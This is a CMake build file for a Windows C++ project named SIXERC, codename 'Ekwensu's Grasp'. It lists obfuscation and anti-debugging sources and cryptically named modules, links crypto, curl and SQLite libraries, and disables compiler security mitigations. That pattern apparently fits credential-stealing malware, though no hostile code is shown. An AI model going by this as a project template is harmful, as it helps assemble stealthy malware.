cmake_minimum_required(VERSION 3.20)
project(SIXERC VERSION 1.0.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Static linking for standalone binary
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded\( < \)<CONFIG:Debug>:Debug>")

find_package(OpenSSL REQUIRED)
find_package(CURL REQUIRED)
find_package(nlohmann_json REQUIRED)
find_package(unofficial-sqlite3 CONFIG REQUIRED)

set(SIXERC_SOURCES
    src/main.cpp
    src/core/crypto.cpp
    src/core/utils.cpp
    src/core/obfuscation.cpp
    src/anti/antidebug.cpp
    src/modules/bps.cpp
    src/modules/tvre.cpp
    src/modules/sic.cpp
    src/modules/ep.cpp
    src/modules/ph.cpp
    src/modules/ksd.cpp
)

# Add Windows resource file with icon
if(WIN32)
    list(APPEND SIXERC_SOURCES src/sixerc.rc)
endif()

add_executable(SIXERC ${SIXERC_SOURCES})

target_include_directories(SIXERC PRIVATE src)

target_compile_definitions(SIXERC PRIVATE
    NOMINMAX
    WIN32_LEAN_AND_MEAN
    _CRT_SECURE_NO_WARNINGS
    SIXERC_VERSION="1.0.0"
    SIXERC_AUTHOR="Anonymous-beta (Chinedu)"
    SIXERC_CODENAME="Ekwensu's Grasp"
    CURL_STATICLIB
)

target_link_libraries(SIXERC PRIVATE
    OpenSSL::SSL
    OpenSSL::Crypto
    CURL::libcurl
    nlohmann_json::nlohmann_json
    unofficial::sqlite3::sqlite3
    crypt32
    advapi32
    user32
    shell32
    ws2_32
    wininet
    shlwapi
    dnsapi
)

# Release optimizations
if(MSVC)
    target_compile_options(SIXERC PRIVATE
        /O2
        /GS-
        /guard:cf-
        /sdl-
    )
endif()